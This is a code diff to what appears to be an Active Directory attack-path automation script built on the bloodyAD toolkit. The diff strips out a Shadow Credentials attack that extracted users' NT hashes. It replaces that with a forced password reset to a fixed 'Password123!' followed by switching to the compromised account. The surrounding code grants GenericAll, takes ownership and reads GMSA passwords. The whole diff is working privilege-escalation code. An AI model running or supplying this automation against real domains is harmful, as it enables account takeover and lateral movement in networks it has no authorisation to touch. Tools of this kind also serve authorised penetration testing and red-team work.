@@ -4,9 +4,8 @@ from bloodyAD.cli_modules import add, set, remove, get
 from bloodyAD.exceptions import LOG
 import asyncio
 
-# Constants
-SIMULATION_PASSWORD = "Shadow_or_Password123!"
-FALLBACK_PASSWORD = "Password123!"
+# Constant for password changes
+PASSWORD_DEFAULT = "Password123!"
 
 class Automation:
     def __init__(self, args, path):
@@ -40,7 +39,6 @@ class Automation:
             "genericAll": "[GenericAll given] on {} to {}",
             "owner": "[Ownership Given] on {} to {}",
             "password": "[Change password] of {} to {}",
-            "shadowCredentials": "[Add Shadow Credentials] to {}",
             "readGMSAPassword": "[Read GMSA Password] from {}",
         }
         print(f"\nAuthenticated as {self.co_args.username}:\n")
@@ -163,55 +161,23 @@ class Automation:
         await self._setOwner(rel)
         await self._genericAll(rel)
 
-    # Use shadow credentials when possible, fallback to password change
+    # ForceChangePassword edge directly changes the password
     async def _forceChangePassword(self, rel):
+        pwd = PASSWORD_DEFAULT
+        operation = set.password
         if self.simulation:
             user = rel["end_node"]["name"]
-            self._printOperation("shadowCredentials", [user])
-            pwd = SIMULATION_PASSWORD
+            self._printOperation(operation.__name__, [user, pwd])
         else:
             user_dn = rel["end_node"]["distinguishedname"]
-            
-            # Try ShadowCredentials first
-            try:
-                LOG.info(f"[*] Attempting ShadowCredentials attack on {user_dn}")
-                nt_hashes = await add.shadowCredentials(self.conn, user_dn)
-                
-                # Extract username and NT hash from the result
-                ldap = await self.conn.getLdap()
-                user_entry = None
-                async for entry in ldap.bloodysearch(user_dn, attr=["sAMAccountName"]):
-                    user_entry = entry
-                    break
-                user = user_entry["sAMAccountName"]
-                
-                # Get the NT hash from the returned credentials
-                nt_hash = None
-                for cred in nt_hashes:
-                    if 'NT' in cred:
-                        nt_hash = cred['NT']
-                        break
-                
-                if nt_hash:
-                    LOG.info(f"[+] ShadowCredentials successful, got NT hash: {nt_hash}")
-                    pwd = f"aad3b435b51404eeaad3b435b51404ee:{nt_hash}"
-                else:
-                    LOG.warning("[!] ShadowCredentials succeeded but no NT hash retrieved, falling back to password change")
-                    raise Exception("No NT hash retrieved from ShadowCredentials")
-                    
-            except Exception as e:
-                LOG.warning(f"[!] ShadowCredentials failed: {str(e)}, falling back to password change")
-                # Fallback to password change
-                pwd = FALLBACK_PASSWORD
-                await set.password(self.conn, user_dn, pwd)
-                user_entry = None
-                ldap = await self.conn.getLdap()
-                async for entry in ldap.bloodysearch(user_dn, attr=["sAMAccountName"]):
-                    user_entry = entry
-                    break
-                user = user_entry["sAMAccountName"]
-                LOG.debug(f"[+] Password changed, switching to LDAP connection for user {user}")
-        
+            await operation(self.conn, user_dn, pwd)
+            ldap = await self.conn.getLdap()
+            user_entry = None
+            async for entry in ldap.bloodysearch(user_dn, attr=["sAMAccountName"]):
+                user_entry = entry
+                break
+            user = user_entry["sAMAccountName"]
+            LOG.debug(f"[+] switching to LDAP connection for user {user}")
         await self._switchUser(user, pwd)
 
     async def _genericAll(self, rel):
